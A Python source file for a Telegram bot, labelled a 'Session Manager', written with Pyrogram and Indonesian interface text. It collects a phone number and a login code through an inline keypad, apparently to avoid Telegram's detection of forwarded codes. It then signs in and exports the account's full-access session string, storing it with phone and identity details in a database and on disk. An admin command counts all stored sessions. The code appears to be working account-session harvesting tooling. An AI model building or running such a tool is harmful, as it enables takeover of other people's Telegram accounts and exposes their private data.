# main.py (VERSI FULL FIX + KEYPAD OTP)
import os
import re
import asyncio
from datetime import datetime
from typing import Dict, Any

from pyrogram import Client, filters, enums
from pyrogram.types import (
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    CallbackQuery,
    Message,
)
from pyrogram.errors import FloodWait, SessionPasswordNeeded, PhoneCodeInvalid

import config
from bot.database import (
    add_session,
    get_sessions_by_owner,
    get_all_sessions,
    delete_sessions_by_owner,
    mark_all_inactive,
    get_sessions_for_disconnect,
)

# === FIX: Folder untuk file .session Pyrogram ===
SESSION_DIR = os.path.join(os.path.dirname(__file__), "sessions")
os.makedirs(SESSION_DIR, exist_ok=True)

# --- INIT BOT ---
app = Client(
    "bot",
    api_id=config.API_ID,
    api_hash=config.API_HASH,
    bot_token=config.BOT_TOKEN,
)

# state login & pending
user_states: Dict[int, str] = {}
pending_logins: Dict[int, Dict[str, Any]] = {}


# === Keypad OTP ===
def otp_keyboard():
    return InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("1", callback_data="digit_1"),
                InlineKeyboardButton("2", callback_data="digit_2"),
                InlineKeyboardButton("3", callback_data="digit_3"),
            ],
            [
                InlineKeyboardButton("4", callback_data="digit_4"),
                InlineKeyboardButton("5", callback_data="digit_5"),
                InlineKeyboardButton("6", callback_data="digit_6"),
            ],
            [
                InlineKeyboardButton("7", callback_data="digit_7"),
                InlineKeyboardButton("8", callback_data="digit_8"),
                InlineKeyboardButton("9", callback_data="digit_9"),
            ],
            [
                InlineKeyboardButton("0", callback_data="digit_0"),
                InlineKeyboardButton("⌫", callback_data="digit_del"),
                InlineKeyboardButton("✔", callback_data="digit_ok"),
            ],
        ]
    )


def main_keyboard():
    return InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("🟢 CONNECT", callback_data="connect"),
                InlineKeyboardButton("📥 READ CODE", callback_data="read_code"),
                InlineKeyboardButton("📱 HP", callback_data="hp"),
            ],
            [
                InlineKeyboardButton("🔐 RESET PW", callback_data="reset_pw"),
                InlineKeyboardButton("🧹 CLEAR SESI", callback_data="clear_sesi"),
                InlineKeyboardButton("📄 LIST SESI", callback_data="list_sesi"),
            ],
            [
                InlineKeyboardButton("🗑 CLEAR CHATS", callback_data="clear_chats"),
                InlineKeyboardButton("🟡 DISCONNECT", callback_data="disconnect"),
            ],
        ]
    )


# ---------- COMMAND HANDLERS ----------
@app.on_message(filters.private & filters.command("start"))
async def start_handler(_, m: Message):
    user_states.pop(m.from_user.id, None)
    await m.reply(
        "**Session Manager Bot**\n\n"
        "• Tekan **CONNECT** untuk mulai login akun baru.\n"
        "• Masukkan kode OTP dengan keypad, tidak perlu forward 777000 lagi.",
        reply_markup=main_keyboard(),
    )


@app.on_message(filters.private & filters.command("users"))
async def users_handler(_, m: Message):
    rows = get_sessions_by_owner(m.from_user.id)
    await m.reply(f"List Active Session\nTotal users: {len(rows)}")


@app.on_message(filters.private & filters.command("admin_users"))
async def admin_users_handler(_, m: Message):
    if m.from_user.id not in config.ADMINS:
        return await m.reply("Kamu bukan admin.")
    rows = get_all_sessions()
    await m.reply(f"[ADMIN] Total semua session tersimpan: {len(rows)}")


# ---------- CALLBACK ROUTER ----------
@app.on_callback_query()
async def callback_router(_, q: CallbackQuery):
    data = q.data
    uid = q.from_user.id

    if data == "connect":
        await handle_connect(q)

    elif data == "read_code":
        await handle_read_code(q)

    elif data == "list_sesi":
        await handle_list_sesi(q)

    elif data == "clear_sesi":
        await handle_clear_sesi(q)

    elif data == "disconnect":
        await handle_disconnect(q)

    elif data == "clear_chats":
        await handle_clear_chats(q)

    elif data == "hp":
        await handle_hp(q)

    elif data.startswith("digit_"):
        await handle_digit(q)

    else:
        await q.answer("Unknown action")


# ---------- CALLBACK IMPLEMENTATION ----------
async def handle_connect(q: CallbackQuery):
    uid = q.from_user.id
    user_states[uid] = "awaiting_phone"

    await q.message.reply(
        "Kirim nomor telepon akun Telegram.\n"
        "Format internasional tanpa +, contoh: `6281234567890`",
        parse_mode=enums.ParseMode.MARKDOWN,
    )
    await q.answer()


async def handle_read_code(q: CallbackQuery):
    await q.answer("Tidak perlu tombol ini.\nGunakan keypad OTP.", show_alert=True)


async def handle_list_sesi(q: CallbackQuery):
    uid = q.from_user.id
    sessions = get_sessions_by_owner(uid)

    if not sessions:
        await q.message.reply("List Active Session\nTotal users: 0")
        await q.answer()
        return

    lines = [f"List Active Session\nTotal users: {len(sessions)}\n"]

    for row in sessions:
        sid = row["id"]
        phone = row.get("phone", "-")
        tg_user_id = row.get("tg_user_id", "-")
        username = row.get("username", "-")
        first_name = row.get("first_name", "-")
        device = row.get("device", "-")
        is_active = row.get("is_active", 1)
        created_at = row.get("created_at", "-")

        status_icon = "✅" if is_active else "❌"

        lines.append(
            f"ID DB: {sid}\n"
            f"STATUS: {status_icon}\n"
            f"TG ID: {tg_user_id}\n"
            f"USERNAME: @{username}\n"
            f"NAMA: {first_name}\n"
            f"NOHP: {phone}\n"
            f"DEVICE: {device}\n"
            f"TANGGAL: {created_at}\n"
            "-------------------------"
        )

    await q.message.reply("\n".join(lines))
    await q.answer()


async def handle_clear_sesi(q: CallbackQuery):
    uid = q.from_user.id
    count = delete_sessions_by_owner(uid)
    await q.message.reply(f"Session sudah tidak ada\nDihapus: {count} record.")
    await q.answer("Sesi dihapus.")


async def handle_disconnect(q: CallbackQuery):
    uid = q.from_user.id
    rows = get_sessions_for_disconnect(uid)

    if not rows:
        await q.answer("Tidak ada session aktif.", show_alert=True)
        return

    success = 0
    for row in rows:
        sid = row["id"]
        session_string = row["session_string"]

        try:
            client = Client(
                name=f"disc_{sid}",
                api_id=config.API_ID,
                api_hash=config.API_HASH,
                session_string=session_string,
                in_memory=True,
            )
            await client.connect()
            await client.log_out()
            await client.disconnect()
            success += 1
        except Exception:
            continue

    mark_all_inactive(uid)
    await q.message.reply(f"DISCONNECT selesai.\nBerhasil logout dari {success} session.")
    await q.answer("Disconnect selesai.")


async def handle_clear_chats(q: CallbackQuery):
    try:
        await app.delete_history(q.message.chat.id, revoke=True)
        await q.answer("Chat dibersihkan.")
    except Exception:
        await q.answer("Gagal clear chats.", show_alert=True)


async def handle_hp(q: CallbackQuery):
    uid = q.from_user.id
    sessions = get_sessions_by_owner(uid)

    if not sessions:
        await q.answer("Belum ada session.", show_alert=True)
        return

    phones = []
    for row in sessions:
        phone = row.get("phone", "-")
        tg_user_id = row.get("tg_user_id", "-")
        username = row.get("username", "-")
        phones.append(f"{phone} → {tg_user_id} (@{username})")

    text = "Daftar nomor yang tersimpan:\n\n" + "\n".join(phones)
    await q.message.reply(text)
    await q.answer()


# ---------- OTP KEYPAD HANDLER ----------
async def handle_digit(q: CallbackQuery):
    uid = q.from_user.id
    pending = pending_logins.get(uid)

    if not pending:
        await q.answer("Tidak ada proses login aktif!", show_alert=True)
        return

    digits = pending.get("code_digits", "")

    action = q.data.replace("digit_", "")

    if action == "del":
        digits = digits[:-1]

    elif action == "ok":
        if len(digits) < 5:
            await q.answer("Kode belum lengkap!", show_alert=True)
            return

        pending["code"] = digits

        await q.message.reply(
            f"Kode OTP diterima: `{digits}`\nMencoba login...",
            parse_mode="markdown",
        )
        return await do_sign_in(q.message, uid)

    else:  
        if len(digits) < 5:
            digits += action

    pending["code_digits"] = digits

    await q.message.edit(
        f"Masukkan kode OTP:\n`{digits}`",
        parse_mode="markdown",
        reply_markup=otp_keyboard(),
    )
    await q.answer()


# ---------- LOGIN FLOW ----------
@app.on_message(filters.private & ~filters.command(["start", "users", "admin_users"]))
async def generic_message_handler(_, m: Message):
    uid = m.from_user.id
    state = user_states.get(uid)

    if state == "awaiting_phone":
        phone = re.sub(r"[^\d]", "", m.text or "")
        if len(phone) < 7:
            await m.reply("Nomor tidak valid.")
            return

        await start_login_process(m, phone)
        return


async def start_login_process(m: Message, phone: str):
    uid = m.from_user.id

    await m.reply(
        f"Mengirim kode ke nomor: `{phone}`\n"
        "Masukkan kode OTP dengan keypad.",
        parse_mode="markdown",
        reply_markup=otp_keyboard(),
    )

    session_name = os.path.join(
        SESSION_DIR, f"{uid}_{int(datetime.now().timestamp())}"
    )

    user_client = Client(
        session_name,
        api_id=config.API_ID,
        api_hash=config.API_HASH,
    )

    try:
        await user_client.connect()
        sent = await user_client.send_code(phone)
    except Exception as e:
        await m.reply(f"Gagal mengirim kode: `{e}`")
        return

    pending_logins[uid] = {
        "client": user_client,
        "phone": phone,
        "session_name": session_name,
        "phone_code_hash": sent.phone_code_hash,
        "code": None,
        "code_digits": "",
    }

    user_states[uid] = "waiting_otp_keypad"


async def do_sign_in(msg: Message, uid: int):
    pending = pending_logins.get(uid)
    if not pending:
        await msg.reply("Tidak ada proses login.")
        return

    client = pending["client"]
    phone = pending["phone"]
    code = pending["code"]
    phone_code_hash = pending["phone_code_hash"]

    try:
        await client.connect()
        await client.sign_in(
            phone_number=phone,
            phone_code=code,
            phone_code_hash=phone_code_hash,
        )
    except PhoneCodeInvalid:
        await msg.reply("Kode salah! Ulangi lagi.")
        return
    except SessionPasswordNeeded:
        await msg.reply("Akun ini memakai 2FA, bot belum support.")
        return
    except FloodWait as e:
        await msg.reply(f"Flood wait {e.value}s.")
        await asyncio.sleep(e.value)
        return
    except Exception as e:
        await msg.reply(f"Gagal login: `{e}`")
        return

    me = await client.get_me()
    session_string = await client.export_session_string()

    created_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    data = {
        "owner_id": uid,
        "phone": phone,
        "session_name": pending["session_name"],
        "session_string": session_string,
        "tg_user_id": me.id,
        "username": me.username,
        "first_name": me.first_name,
        "device": "PyrogramClient",
        "is_active": 1,
        "created_at": created_at,
    }

    add_session(data)

    txt_path = pending["session_name"] + ".txt"
    with open(txt_path, "w", encoding="utf-8") as f:
        f.write(session_string)

    summary = (
        "✅ Session berhasil dibuat!\n\n"
        f"ID: `{me.id}`\n"
        f"USERNAME: @{me.username or '-'}\n"
        f"NAMA: {me.first_name}\n"
        f"NOHP: `{phone}`\n"
        f"TANGGAL: {created_at}\n"
    )

    await msg.reply(summary, reply_markup=main_keyboard())

    await app.send_document(msg.chat.id, txt_path, caption="String session kamu.")

    try:
        await client.disconnect()
    except:
        pass

    pending_logins.pop(uid, None)
    user_states.pop(uid, None)


# ---------- MAIN ----------
if __name__ == "__main__":
    print("BOT SESSION MANAGER BERJALAN...")
    app.run()
